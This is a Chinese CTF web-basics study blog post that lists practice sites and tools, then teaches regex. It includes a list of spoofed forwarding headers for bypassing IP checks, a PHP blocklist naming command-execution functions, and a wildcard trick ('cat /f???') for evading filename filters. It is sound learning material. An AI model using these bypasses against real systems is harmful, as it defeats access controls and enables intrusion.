<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Web基础 | PureStream &amp; Marblue</title><meta name="author" content="Pure Stream"><meta name="copyright" content="Pure Stream"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTF·Web基础（持续更新，暂定）每个知识点后面都会附带若干例题进行讲解，覆盖基础到综合 一些网站先知社区 先知社区 各种别人的blog 刷题网站https:&#x2F;&#x2F;www.polarctf.com&#x2F;#&#x2F;page&#x2F;challenges POLAR靶场 题库 | NSSCTF NSS BUUCTF在线评测 BUU 攻防世界 攻防世界 登录 春秋云镜（Web渗透） CTFHub CTFhub …. 常用">
<meta property="og:type" content="article">
<meta property="og:title" content="Web基础">
<meta property="og:url" content="https://purestream108.github.io/project/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/index.html">
<meta property="og:site_name" content="PureStream &amp; Marblue">
<meta property="og:description" content="CTF·Web基础（持续更新，暂定）每个知识点后面都会附带若干例题进行讲解，覆盖基础到综合 一些网站先知社区 先知社区 各种别人的blog 刷题网站https:&#x2F;&#x2F;www.polarctf.com&#x2F;#&#x2F;page&#x2F;challenges POLAR靶场 题库 | NSSCTF NSS BUUCTF在线评测 BUU 攻防世界 攻防世界 登录 春秋云镜（Web渗透） CTFHub CTFhub …. 常用">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://purestream108.github.io/project/img/purestream.jpg">
<meta property="article:published_time" content="2025-05-31T09:21:08.000Z">
<meta property="article:modified_time" content="2025-06-10T15:28:43.153Z">
<meta property="article:author" content="Pure Stream">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Study">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://purestream108.github.io/project/img/purestream.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Web基础",
  "url": "https://purestream108.github.io/project/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/",
  "image": "https://purestream108.github.io/project/img/purestream.jpg",
  "datePublished": "2025-05-31T09:21:08.000Z",
  "dateModified": "2025-06-10T15:28:43.153Z",
  "author": [
    {
      "@type": "Person",
      "name": "Pure Stream",
      "url": "https://purestream108.github.io/project/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/marblue.jpg"><link rel="canonical" href="https://purestream108.github.io/project/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Pure Stream","link":"链接: ","source":"来源: PureStream & Marblue","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Web基础',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="stylesheet" href="/css/prism.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/lazy.gif" data-original="/img/purestream.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/"><i class="fa-fw fas fa-heart"></i><span> Animation</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/l1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">PureStream &amp; Marblue</span></a><a class="nav-page-title" href="/"><span class="site-name">Web基础</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/"><i class="fa-fw fas fa-heart"></i><span> Animation</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Web基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-31T09:21:08.000Z" title="发表于 2025-05-31 17:21:08">2025-05-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-10T15:28:43.153Z" title="更新于 2025-06-10 23:28:43">2025-06-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CTF·Web基础（持续更新，暂定）"><a href="#CTF·Web基础（持续更新，暂定）" class="headerlink" title="CTF·Web基础（持续更新，暂定）"></a>CTF·Web基础（持续更新，暂定）</h1><p>每个知识点后面都会附带若干例题进行讲解，覆盖基础到综合</p>
<h2 id="一些网站"><a href="#一些网站" class="headerlink" title="一些网站"></a>一些网站</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news">先知社区</a> 先知社区</p>
<p>各种别人的blog</p>
<h2 id="刷题网站"><a href="#刷题网站" class="headerlink" title="刷题网站"></a>刷题网站</h2><p><a target="_blank" rel="noopener" href="https://www.polarctf.com/#/page/challenges">https://www.polarctf.com/#/page/challenges</a> POLAR靶场</p>
<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem">题库 | NSSCTF</a> NSS</p>
<p><a target="_blank" rel="noopener" href="https://buuoj.cn/login?next=/challenges?">BUUCTF在线评测</a> BUU</p>
<p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> 攻防世界</p>
<p><a target="_blank" rel="noopener" href="https://yunjing.ichunqiu.com/login">登录</a> 春秋云镜（Web渗透）</p>
<p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/index">CTFHub</a> CTFhub</p>
<p>….</p>
<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">maurosoria&#x2F;dirsearch: Web path scanner</a> Dirsearch目录扫描工具</p>
<p>[<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/]">https://github.com/AntSwordProject/]</a> 蚁剑</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Marven11/FenJing">Marven11&#x2F;Fenjing: 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 | A Jinja2 SSTI cracker for bypassing WAF, designed for CTF</a> Fenjing</p>
<p><a target="_blank" rel="noopener" href="https://old.xp.cn/download.html">Windows版phpstudy下载 - 小皮面板(phpstudy)</a> Phpstudy (用来展示运行php代码的结果)</p>
<p><a target="_blank" rel="noopener" href="https://github.com/notepad-plus-plus/notepad-plus-plus/releases/">发布 ·记事本加加&#x2F;记事本加加</a> NotePad++</p>
<p><a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">netcat 1.11 for Win32&#x2F;Win64</a> netcat</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/muriyue6/article/details/107127217">Windows 下载安装 netcat(nc)命令_netcat下载-CSDN博客</a> 教程</p>
<p>….</p>
<h2 id="源码查看"><a href="#源码查看" class="headerlink" title="源码查看"></a>源码查看</h2><p>基本查看+各个浏览器的快捷键（视情况可略过）</p>
<h2 id="控制台-游戏"><a href="#控制台-游戏" class="headerlink" title="控制台+游戏"></a>控制台+游戏</h2><p>前端JS改变量值和JS部分审计（主要是CTF前端游戏部分）（结合最近五一的mini-LCTF）</p>
<p><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/18?challenge=822">Mini L-CTF 2025 - 西电 CTF 终端</a>  GuessOneGuess Miniup</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>改浏览器信息+改本地地址+改地址+VPN+POST&#x2F;GET…..（视情况可略过）</p>
<p><img src="/img/lazy.gif" data-original="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250512100340274.png" alt="image-20250512100340274"></p>
<p><img src="/img/lazy.gif" data-original="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250512100414377.png" alt="image-20250512100414377"></p>
<p><img src="/img/lazy.gif" data-original="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250512100427182.png" alt="image-20250512100427182"></p>
<p>然后如果要求VPN的话就是用<code>Via</code></p>
<p>对于XFF的绕过形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Client-IP:127.0.0.1</span><br><span class="line">Forwarded-For-Ip: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">Forwarded-For: localhost</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">Forwarded: localhost</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br><span class="line">X-Custom-IP-Authorization : 127.0.0.1</span><br><span class="line">X-Forward-For: 127.0.0.1</span><br><span class="line">X-Forward: 127.0.0.1</span><br><span class="line">X-Forward: localhost</span><br><span class="line">X-Forwarded-By:127.0.0.1</span><br><span class="line">X-Forwarded-By: localhost</span><br><span class="line">X-Forwarded-For-Original: 127.0.0.1</span><br><span class="line">X-Forwarded-For-original: localhost</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded-For: localhost</span><br><span class="line">X-Forwarded-Server: 127.0.0.1</span><br><span class="line">X-Forwarded-Server: localhost</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">X-Forwarded: localhost</span><br><span class="line">X-Forwared-Host: 127.0.0.1</span><br><span class="line">X-Forwared-Host: localhost</span><br><span class="line">X-Host: 127.0.0.1</span><br><span class="line">X-Host: localhost</span><br><span class="line">X-HTTP-Host-Override : 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-Remote-Addr : localhost</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3740">GDOUCTF 2023]EZ WEB | NSSCTF</a> PUT</p>
<p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3408">MoeCTF 2021]Do you know HTTP | NSSCTF</a></p>
<p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]Begin of HTTP)</p>
<h2 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h2><p><a target="_blank" rel="noopener" href="https://regex101.com/">regex101: build, test, and debug regex</a> 测试正则的</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式 – 语法 | 菜鸟教程</a> 参考</p>
<p>介绍常见的正则表达式与语法</p>
<p>(以下一切的语法都可以在上面那个链接做演示)</p>
<p>(Python中想要使用正则需要使用re库)</p>
<h3 id="ABC"><a href="#ABC" class="headerlink" title="[ABC]"></a><strong>[ABC]</strong></h3><p>匹配[…]中的所有字符</p>
<p>例如 <strong>[aeiou]</strong> 匹配字符串 “google runoob taobao” 中所有的 e o u a 字母</p>
<p>然后**[A-Z]**就是匹配A-Z中的所有字母（26个大写字母）</p>
<hr>
<h3 id="ABC-1"><a href="#ABC-1" class="headerlink" title="[^ABC]"></a>[^ABC]</h3><p>匹配除了 <strong>[…]</strong> 中字符的所有字符，例如 <strong>[^aeiou]</strong> 匹配字符串 “google runoob taobao” 中除了 e o u a 字母的所有字符</p>
<hr>
<h3 id=""><a href="#" class="headerlink" title="."></a>.</h3><p>匹配除换行符（\n、\r）之外的任何单个字符，相等于 <strong>[^&#x2F;n&#x2F;r]</strong></p>
<hr>
<h3 id="s-S"><a href="#s-S" class="headerlink" title="[\s\S]"></a>[\s\S]</h3><p>匹配所有。\s 是匹配所有空白符，包括换行，\S 非空白符，不包括换行</p>
<p><strong>空白符的定义</strong></p>
<ul>
<li>在正则表达式中，空白符是用来匹配空格、制表符、换行符等不可见字符的特殊字符类。它包括以下几种常见的空白字符：<ul>
<li>空格（ ）：就是键盘上的空格键所产生的字符，用于分隔单词等</li>
<li>制表符（\t）：用于在文本中进行水平制表对齐，使文本内容在显示或打印时能够整齐排列</li>
<li>换行符（\n）：用于表示一行文本的结束，新的一行的开始。在不同的操作系统中，换行符可能有所不同，例如在 Windows 系统中是 \r\n，在 Unix&#x2F;Linux 系统中是 \n</li>
<li>换页符（\f）：较少使用，用于将打印机的打印位置移动到下一页的开头</li>
<li>垂直制表符（\v）：也比较少用，用于垂直方向的制表对齐</li>
</ul>
</li>
</ul>
<p><strong>非空白符的定义</strong></p>
<ul>
<li>非空白符是指除空白符之外的所有可见字符，也可以包括一些不可见的控制字符，但不包括空白符所包含的字符。在正则表达式中，可以用 \S 来表示非空白符。例如，正则表达式 \S+ 可以匹配一个或多个非空白符</li>
</ul>
<hr>
<h3 id="w"><a href="#w" class="headerlink" title="\w"></a>\w</h3><p>匹配字母、下划线、数字</p>
<p>相当于 <strong>[A-Za-z0-9_]</strong></p>
<hr>
<h3 id="d"><a href="#d" class="headerlink" title="\d"></a>\d</h3><p>匹配任意一个阿拉伯数字</p>
<p>相当于 <strong>[0-9]</strong></p>
<hr>
<h3 id="i"><a href="#i" class="headerlink" title="&#x2F;i"></a>&#x2F;i</h3><p>忽略大小写，就比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|flag|zlib|ftp|system|shell_exec|exec|file_get_contents|proc_open|fopen|fgets|file_put_contents|file|fread|readfile|stream_get_contents|cat|more|tac|\:|\]|\[|\+|\-|\*|\eval|\^|\`|\&quot;|\&lt;|\&gt;|\\|\/|\ssh/i&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这里加了个 <strong>&#x2F;i</strong>，那你的Php,PhP这种的都会被当作php处理，就防止你进行大小写绕过</p>
<hr>
<h3 id="匹配特殊字符"><a href="#匹配特殊字符" class="headerlink" title="匹配特殊字符 &#x2F;"></a>匹配特殊字符 &#x2F;</h3><p>你就在 <strong>&#x2F;</strong> 后面加你想要过滤的</p>
<p>比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/php|flag|zlib|ftp|system</span><br></pre></td></tr></table></figure>

<p><strong>|</strong> 作为分隔符</p>
<p>如果想要过滤特别字符，比如 <strong>$</strong>, * , <strong>^</strong></p>
<p>就要在前面加转义符号 <code>\</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|\+|\-|\*|\<span class="keyword">eval</span>|\^|\`|\<span class="string">&quot;|\&lt;|\&gt;|\\|\/|</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="限定符号"><a href="#限定符号" class="headerlink" title="限定符号"></a>限定符号</h3><table>
<thead>
<tr>
<th>*</th>
<th>匹配前面的子表达式零次或多次。例如，<strong>zo*</strong> 能匹配 <strong>“z”</strong> 以及 <strong>“zoo”<strong>。</strong></strong>* 等价于 <strong>{0,}</strong> ，其实就是匹配所以以这个开头的字符串，比如cat &#x2F;f*</th>
<th><a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=b%7Cab%7Caab&tips=a*b">尝试一下 »</a></th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>匹配前面的子表达式一次或多次。例如，<strong>zo+</strong> 能匹配 <strong>“zo”</strong> 以及 “**zoo”**，但不能匹配 <strong>“z”<strong>。</strong>+</strong> 等价于 <strong>{1,}</strong></td>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=ab%7Caab%7Caaab&tips=a+b">尝试一下 »</a></td>
</tr>
<tr>
<td>?</td>
<td>匹配前面的子表达式零次或一次。例如，<strong>do(es)?</strong> 可以匹配 <strong>“do”</strong> 、 **”does”**、 <strong>“doxy”</strong> 中的 <strong>“do”</strong> 和 <strong>“does”<strong>。</strong>?</strong> 等价于 <strong>{0,1}<strong>，要是知道flag文件长度，你可以直接</strong>cat &#x2F;f???<strong>，这就相当于</strong>cat &#x2F;flag</strong>，但绕过了对flag的过滤</td>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=color%7Ccolour%7Ccolour123&tips=colou?r">尝试一下 »</a></td>
</tr>
<tr>
<td>{n}</td>
<td>n 是一个非负整数。匹配确定的 <strong>n</strong> 次。例如，<strong>o{2}</strong> 不能匹配 <strong>“Bob”</strong> 中的 <strong>o</strong>，但是能匹配 <strong>“food”</strong> 中的两个 <strong>o</strong></td>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=123aac%7C456abc%7C789acc&tips=%5Cd%7B3%7D">尝试一下 »</a></td>
</tr>
<tr>
<td>{n,}</td>
<td>n 是一个非负整数。至少匹配n 次。例如，<strong>o{2,}</strong> 不能匹配 <strong>“Bob”</strong> 中的 <strong>o</strong>，但能匹配 <strong>“foooood”</strong> 中的所有 <strong>o</strong>。<strong>o{1,}</strong> 等价于 <strong>o+<strong>。</strong>o{0,}</strong> 则等价于 <strong>o*</strong></td>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=12aac%7C3456abc%7C789acc&tips=%5Cd%7B2,%7D">尝试一下 »</a></td>
</tr>
<tr>
<td>{n,m}</td>
<td>m 和 n 均为非负整数，其中 n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。例如，<strong>o{1,3}</strong> 将匹配 <strong>“fooooood”</strong> 中的前三个 <strong>o</strong>。<strong>o{0,1}</strong> 等价于 **o?**。请注意在逗号和两个数之间不能有空格</td>
<td></td>
</tr>
</tbody></table>
<p>E.g</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]*/</span><br></pre></td></tr></table></figure>

<ol>
<li><code>[1-9]</code>：匹配一个1到9之间的数字，即数字不能以0开头</li>
<li><code>[0-9]*</code>：匹配<strong>0个或多个</strong>0到9之间的数字</li>
</ol>
<p>例如：</p>
<ul>
<li>匹配：<code>1</code>, <code>12</code>, <code>999</code>, <code>1024</code></li>
<li>不匹配：<code>0</code>（以零开头）, <code>012</code>（以零开头）, <code>abc</code>（非数字）</li>
</ul>
<p>如果删去了 *</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]/</span><br></pre></td></tr></table></figure>

<p>就只能匹配两位数字了</p>
<p>当然 <strong>&#x2F;[0-9]{1,2}&#x2F;</strong> 也可以匹配两位数字，但是允许01，00，02这种的出现</p>
<p>避免这种情况</p>
<p>改进下，匹配 1~99 的正整数表达式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]?/</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[1-9][0-9]&#123;0,1&#125;/</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="贪婪匹配和非贪婪匹配"><a href="#贪婪匹配和非贪婪匹配" class="headerlink" title="贪婪匹配和非贪婪匹配"></a>贪婪匹配和非贪婪匹配</h3><p><code>*</code> 和 <code>+</code> 限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个 ? 就可以实现非贪婪或最小匹配</p>
<p>以匹配 HTML 文档为例</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>miHoYo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>贪婪：</strong>下面的表达式匹配从开始小于符号 (&lt;) 到关闭 h1 标记的大于符号 (&gt;) 之间的所有内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&lt;.*&gt;/</span><br></pre></td></tr></table></figure>

<p>会匹配整个 <code>&lt;h1&gt;miHoYo&lt;/h1&gt;</code></p>
<p><strong>非贪婪：</strong>如果您只需要匹配开始和结束 h1 标签，下面的非贪婪表达式只匹配 <code>&lt;h1&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&lt;.*?&gt;/</span><br></pre></td></tr></table></figure>

<p>只会匹配到 <code>&lt;h1&gt;</code></p>
<p>通过在 *<strong><strong>、</strong>+</strong> 或 <strong>?</strong> 限定符之后放置 **?**，该表达式从”贪婪”表达式转换为”非贪婪”表达式或者最小匹配</p>
<hr>
<h3 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h3><p>定位符使您能够将正则表达式固定到行首或行尾</p>
<p>定位符用来描述字符串或单词的边界，<strong>^</strong> 和 <strong>$</strong> 分别指字符串的开始与结束，<strong>\b</strong> 描述单词的前或后边界，<strong>\B</strong> 表示非单词边界</p>
<p>正则表达式的定位符有：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">^</td>
<td align="left">匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配</td>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=Aaa%7CAbb%7CAcc&tips=%5EA">尝试一下 »</a></td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配</td>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=aaRUNOOB%7CbbRUNOOB%7CccRUNOOB&tips=RUNOOB$">尝试一下 »</a></td>
</tr>
<tr>
<td align="left">\b</td>
<td align="left">匹配一个单词边界，即字与空格间的位置</td>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=aacat%7Ccatbb%7Ccatcc&tips=%5Cbcat%5Cw*">尝试一下 »</a></td>
</tr>
<tr>
<td align="left">\B</td>
<td align="left">非单词边界匹配</td>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/try/try-regex.php?texts=google%7Crunoob%7Ctaobao&tips=%5CBoo%5CB">尝试一下 »</a></td>
</tr>
</tbody></table>
<p><strong>注意</strong>：不能将限定符与定位符一起使用。由于在紧靠换行或者单词边界的前面或后面不能有一个以上位置，因此不允许诸如 <strong>^*</strong> 之类的表达式</p>
<p>若要匹配一行文本开始处的文本，请在正则表达式的开始使用 <strong>^</strong> 字符。不要将 <strong>^</strong> 的这种用法与中括号表达式内的用法混淆</p>
<p>若要匹配一行文本的结束处的文本，请在正则表达式的结束处使用 <strong>$</strong> 字符</p>
<p>若要在搜索章节标题时使用定位点，下面的正则表达式匹配一个章节标题，该<strong>标题只包含两个尾随数字，并且出现在行首</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^Chapter [1-9][0-9]&#123;0,1&#125;/</span><br></pre></td></tr></table></figure>

<p>如果要匹配的是：</p>
